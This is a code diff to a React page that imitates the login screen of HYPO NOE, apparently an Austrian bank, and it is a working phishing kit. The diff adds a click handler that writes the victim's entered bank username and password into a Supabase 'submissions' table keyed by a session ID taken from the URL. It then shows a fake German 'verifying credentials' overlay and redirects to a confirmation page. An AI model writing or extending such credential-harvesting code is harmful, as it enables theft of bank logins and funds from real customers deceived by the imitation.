@@ -1,15 +1,25 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { X, Info } from "lucide-react";
 import hyponoeLogo from "@/assets/hyponoe-logo.jpg";
 import hyponoeBg from "@/assets/hyponoe-bg.png";
 
 const HypoNoe = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
   const [isPasswordFocused, setIsPasswordFocused] = useState(false);
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
       {/* Header */}
       <header style={{ backgroundColor: "#fff" }}>
@@ -164,7 +174,18 @@ const HypoNoe = () => {
             <button
               className="w-full py-2 text-white font-normal text-sm"
               style={{ backgroundColor: "#0066cc" }}
-            >
+            
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}>
               Weiter
             </button>
 
@@ -195,6 +216,7 @@ const HypoNoe = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
